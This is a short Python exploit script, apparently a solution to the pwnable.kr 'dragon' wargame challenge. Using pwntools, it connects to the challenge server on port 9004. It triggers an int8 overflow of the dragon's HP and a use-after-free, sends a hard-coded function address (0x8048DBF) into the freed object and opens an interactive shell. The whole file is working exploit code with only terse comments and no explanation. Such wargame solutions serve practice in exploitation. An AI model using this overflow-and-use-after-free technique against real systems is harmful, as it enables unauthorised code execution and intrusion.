###int8 overflow & UAF

from pwn import *

###Utils
def suicide():
    r.sendlineafter('Knight\n','1')
    r.sendlineafter('Invincible.\n','1')
    r.sendlineafter('Invincible.\n','1')

def kill_dragon():
    #dragon HP overflow
    r.sendlineafter('Knight\n','1')
    for i in range(4):
        print(i)
        r.sendlineafter('Invincible.\n','3')
        r.sendlineafter('Invincible.\n','3')
        r.sendlineafter('Invincible.\n','2')


###Addr
target = 0x8048DBF

###Exploit
r = remote('pwnable.kr',9004)

suicide()
kill_dragon()

r.sendlineafter('As:\n',p32(target))
r.interactive()
